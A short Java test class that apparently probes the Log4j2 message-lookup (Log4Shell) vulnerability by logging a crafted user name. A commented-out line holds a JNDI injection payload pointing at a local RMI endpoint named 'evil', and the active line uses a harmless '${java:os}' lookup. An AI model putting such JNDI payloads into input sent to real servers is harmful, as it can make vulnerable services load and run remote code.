package com.yicaida.provider.service.impl;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {

    private static final Logger LOGGER =  LogManager.getLogger(Log4j2Test.class);

    public static void main(String[] args) {
//        String userName = "${jndi:rmi://localhost:1009/evil}";
        String userName = "${java:os}";

        LOGGER.info("hello,{}!", userName);
    }
}
